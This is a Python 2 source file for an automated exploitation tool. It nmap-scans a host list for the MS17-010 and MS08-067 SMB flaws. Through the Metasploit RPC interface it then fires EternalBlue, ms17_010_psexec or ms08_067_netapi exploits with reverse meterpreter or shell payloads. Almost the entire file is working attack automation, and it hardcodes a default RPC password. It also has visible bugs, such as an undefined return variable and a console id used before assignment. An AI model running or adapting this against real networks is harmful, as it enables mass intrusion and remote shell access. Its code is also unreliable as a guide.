#!/usr/bin/env python2

import os
import sys
import time
import msfrpc
import argparse
import netifaces
from IPython import embed
from termcolor import colored
from threading import Thread, Lock
from libnmap.process import NmapProcess
from netaddr import IPNetwork, AddrFormatError
from subprocess import Popen, PIPE, CalledProcessError
from libnmap.parser import NmapParser, NmapParserException

CLIENT = msfrpc.Msfrpc({})

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-p", "--password", default='Au70PwN', help="Password for msfrpc")
    parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
    parser.add_argument("-x", "--xml", help="Nmap XML file")
    return parser.parse_args()

# Colored terminal output
def print_bad(msg):
    print(colored('[-] ', 'red') + msg)

def print_info(msg):
    print(colored('[*] ', 'blue') + msg)

def print_good(msg):
    print(colored('[+] ', 'green') + msg)

def print_great(msg):
    print(colored('[!] {}'.format(msg), 'yellow', attrs=['bold']))

def keep_alive(args, lock):
    '''
    msfrpc will kill auth tokens after 5m
    '''
    global CLIENT

    last_check = time.time()
    while True:
        if time.time() - last_check > 100:
            with lock:
                CLIENT.login(args.username, args.password)
        time.sleep(1)

def run_proc(cmd):
    '''
    Runs single commands
    '''
    cmd_split = cmd.split()
    print_info('Running: {}'.format(cmd))
    proc = Popen(cmd_split, stdout=PIPE, stderr=PIPE)

    return proc

def parse_nmap(args):
    '''
    Either performs an Nmap scan or parses an Nmap xml file
    Will either return the parsed report or exit script
    '''
    if args.xml:
        try:
            report = NmapParser.parse_fromfile(args.xml)
        except IOError:
            print_bad('Host file not found: {}'.format(args.xml))
            sys.exit()

    elif args.hostlist:
        hosts = []
        with open(args.hostlist, 'r') as hostlist:
            host_lines = hostlist.readlines()
            for line in host_lines:
                line = line.strip()
                try:
                    if '/' in line:
                        hosts += [str(ip) for ip in IPNetwork(line)]
                    elif '*' in line:
                        print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                        sys.exit()
                    else:
                        hosts.append(line)
                except (OSError, AddrFormatError):
                    print_bad('Error importing host list file. Are you sure you chose the right file?')
                    sys.exit()

        report = nmap_scan(hosts)

    else:
        print_bad('Specify hostlist with: -l <hostlist.txt>')
        sys.exit()

    return report

def nmap_scan(hosts):
    '''
    Do Nmap scan
    '''
    #nmap_args = '-sS -T4 -sV -n --max-retries 5 -oA autopwn-scan'
    nmap_args = '-sS -O -T4 -sV -n --max-retries 5 --script smb-vuln-ms17-010,smb-vuln-ms08-067 -oA autopwn-scan'
    nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
    rc = nmap_proc.sudo_run_background()
    nmap_status_printer(nmap_proc)
    report = NmapParser.parse_fromfile(os.getcwd()+'/autopwn-scan.xml')

    return report

def nmap_status_printer(nmap_proc):
    '''
    Prints that Nmap is running
    '''
    i = -1
    x = -.5
    while nmap_proc.is_running():
        i += 1
        # Every 30 seconds print that Nmap is still running
        if i % 30 == 0:
            x += .5
            print_info("Nmap running: {} min".format(str(x)))

        time.sleep(1)

def get_hosts(report):
    '''
    Prints host data
    '''
    hosts = []

    print_info('Parsing hosts')
    for host in report.hosts:
        if host.is_up():
            ip = host.address
            nmap_os_raw = host.os_class_probabilities()

            if len(nmap_os_raw) > 0:
                nmap_os = str(nmap_os_raw[0]).split(':')[1].split('\r\n')[0].strip()
            else:
                # Default to Windows
                nmap_os = '?'

            print_info('{} - {}'.format(ip, nmap_os))
            for s in host.services:
                if s.open():

                    if host not in hosts:
                        hosts.append(host)

                    if 'product: ' in s.banner:
                        banner = s.banner.split('product: ')[1]
                    else:
                        banner = s.banner

                    port = str(s.port)
                    print '          {} - {}'.format(port, banner)

    if len(hosts) == 0:
        print_bad('No hosts found')
        sys.exit()

    return hosts

def check_named_pipes(c_id, ip, nmap_os):
    '''
    If we can avoid EternalBlue we will because EternalRomance/Synergy
    works on more versions of Windows
    If we can get a named pipe then we'll use Romance/Synergy over Blue
    '''
    pipes = None
    pipe_audit_path = 'auxiliary/scanner/smb/pipe_auditor'
    rhost_var = 'RHOSTS'
    port = '445'
    extra_opts = ''
    payload = get_payload(pipe_audit_path, nmap_os)
    pipe_auditor_cmd = create_msf_cmd(pipe_audit_path, rhost_var, ip, port, payload, extra_opts)
    output = get_module_output(c_id, pipe_auditor_cmd)

    # Example output:
    '''
    ['RHOSTS => 192.168.243.129',
       '[*] 192.168.243.129:445   - Pipes: \\netlogon, \\lsarpc, \\samr, \\atsvc, \\epmapper, \\eventlog, \\InitShutdown, \\lsass, \\LSM_API_service, \\ntsvcs, \\protected_storage, \\scerpc, \\srvsvc, \\W32TIME_ALT, \\wkssvc',
       '[*] Scanned 1 of 1 hosts (100% complete)',
       '[*] Auxiliary module execution completed']
    '''

    for l in output:
        delim = 'Pipes: '
        if delim in l:
            pipes = l.split(delim)[1].split(', ')

    return pipes

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

def create_msf_cmd(module_path, rhost_var, ip, port, payload, extra_opts):
    '''
    You can set arbitrary options that don't get used which is why we autoinclude
    ExitOnSession True; even if we use aux module this just won't do anything
    '''
    local_ip = get_local_ip(get_iface())
    print_info('Executing {}'.format(module_path))
    cmds = """
           use {}\n
           set {} {}\n
           set RPORT {}\n
           set LHOST {}\n
           set payload {}\n
           {}\n
           set ExitOnSession True\n
           exploit -z\n
           """.format(module_path, rhost_var, ip, port, local_ip, payload, extra_opts)

    return cmds

def get_module_output(c_id, cmd):
    '''
    Runs module and gets output
    '''
    CLIENT.call('console.write',[c_id, cmd])
    time.sleep(3)
    mod_output = wait_on_busy_console(c_id)

    return mod_output

def get_payload(module, nmap_os):
    '''
    Automatically get compatible payloads
    '''
    payload = None
    win_payloads = ['windows/meterpreter/reverse_https',
                    'windows/x64/meterpreter/reverse_https',
                    'java/meterpreter/reverse_https',
                    'java/jsp_shell_reverse_tcp']

    unix_payloads = ['java/meterpreter/reverse_https',
                     'java/jsp_shell_reverse_tcp',
                     'cmd/unix/reverse']

    payloads = CLIENT.call('module.compatible_payloads',[module])

    if payloads.get('error'):
        if 'auxiliary' not in module:
            print_bad('Error getting payload for {}'.format(module))
        else:
            # For aux modules we just set an arbitrary real payload
            payload = win_payloads[0]
    else:
        payloads = payloads['payloads']

    # Set a preferred payload based on OS
    if 'windows' in nmap_os.lower():
        for p in win_payloads:
            if p in payloads:
                payload = p
    elif 'nix' in nmap_os.lower():
        for p in win_payloads:
            if p in payloads:
                payload = p

    # No preferred payload found. If aux module, just set it to rev_https bc it doesn't matter
    if payload == None:
        if 'auxiliary' not in module:
            print_bad('No preferred payload found, here\'s what was found:')
            for p in payloads:
                print '    '+p
            print_info('Setting payload to {} and continuing'.format(win_payloads[0]))

        payload = win_payloads[0]

    return payload

def check_nse_vuln_scripts(host, script):
    '''
    Check if host if vulnerable via nse script
    '''
    ip = host.address
    for script_out in host.scripts_results:
        if script_out['id'] == script:
            if 'State: VULNERABLE' in script_out['output']:
                print_good('NSE script {} found vulnerable host: {}'.format(script, ip))
                return True

    return False

def run_exploits(c_id, host):
    '''
    Checks for exploitable services on a host
    '''
    # First check for ms08_067 and ms17_010
    ms08_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms08-067')
    ms17_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms17-010')
    if ms08_vuln == True:
        mod_output = run_ms08(c_id, host)
    if ms17_vuln == True:
        mod_output = run_ms17(c_id, host)

#def print_module_output(output, module):
#    print_info('{} output:'.format(module))
#    for l in output:
#        print '    '+l.strip()

def run_ms08(c_id, host):
    '''
    Exploit ms08_067
    '''
    ip = host.address
    nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
    port = '445'
    ms08_path = 'exploit/windows/smb/ms08_067_netapi'
    ms08_rhost_var = 'RHOST'
    ms08_opts = ''
    ms08_payload = get_payload(ms08_path, nmap_os)
    ms08_cmd = create_msf_cmd(ms08_path, ms08_rhost_var, ip, port, ms08_payload, ms08_opts)
    mod_output = get_module_output(c_id, ms08_cmd)

    return output

def run_ms17(c_id, host):
    '''
    Exploit ms17_010
    '''
    ip = host.address
    nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
    port = '445'

    # Check for named pipe availability (preVista you could just grab em)
    # If we find one, then use Romance/Synergy instead of Blue
    named_pipe = None
    named_pipes = check_named_pipes(c_id, ip, nmap_os)

    # Just use the first named pipe
    if named_pipes:
        named_pipe = named_pipes[0]

    ms17_rhost_var = 'RHOST'

    if named_pipe:
        ms17_path = 'exploit/windows/smb/ms17_010_psexec'
        ms17_opts = 'set NAMEDPIPE {}'.format(named_pipe)
    else:
        ms17_path = 'exploit/windows/smb/ms17_010_eternalblue'
        ms17_opts = ''

    ms17_payload = get_payload(ms17_path, nmap_os)

    ms17_cmd = create_msf_cmd(ms17_path, ms17_rhost_var, ip, port, ms17_payload, ms17_opts)
    mod_output = get_module_output(c_id, ms17_cmd)

    return mod_output

def wait_on_busy_console(c_id):
    '''
    The only way to get console busy status is through console.read or console.list
    console.read clears the output buffer so you gotta use console.list
    but console.list requires you know the list offset of the c_id console
    so this ridiculous list comprehension seems necessary to avoid assuming
    what the right list offset might be
    '''
    output = []
    list_offset = int([x['id'] for x in CLIENT.call('console.list')['consoles'] if x['id'] is c_id][0])
    while CLIENT.call('console.list')['consoles'][list_offset]['busy'] == True:
        cur_output = CLIENT.call('console.read', [c_id])['data'].splitlines()
        for l in cur_output:
            l = l.strip()
            output.append(l)
            print '    '+l.strip()
        time.sleep(1)

    # Get remaining output
    cur_output = CLIENT.call('console.read', [c_id])['data'].splitlines()
    for l in cur_output:
        l = l.strip()
        output.append(l)
        print '    '+l.strip()

    return output

def main(report, args):
    global CLIENT

    lock = Lock()

    # hosts will only be populated with ips that have open ports
    # hosts = {ip : [(port, banner), (port2, banner2)]
    hosts = get_hosts(report)

    # initialize keep alive process
    # won't attempt first login until 100s from start
    p = Thread(target=keep_alive, args=(args, lock))
    p.setDaemon(True)
    p.start()

    CLIENT.login(args.username, args.password)

    c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]

    if len(c_ids) == 0:
        CLIENT.call('console.create')
        c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]
        # Clear output buffer
        CLIENT.call('console.read', [c_id])['data'].splitlines()

    # Get the latest console
    c_id = c_ids[-1]

    for host in hosts:
        run_exploits(c_id, host)
        remainder_output = wait_on_busy_console(c_id)

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        print_bad('Run as root')
        sys.exit()
    report = parse_nmap(args)
    main(report, args)

#TODO
# Add JBoss, Struts, Tomcat, Jenkins, WebSphere
# Why are named pipes printing twice?
# Why can't I accurately read module output?
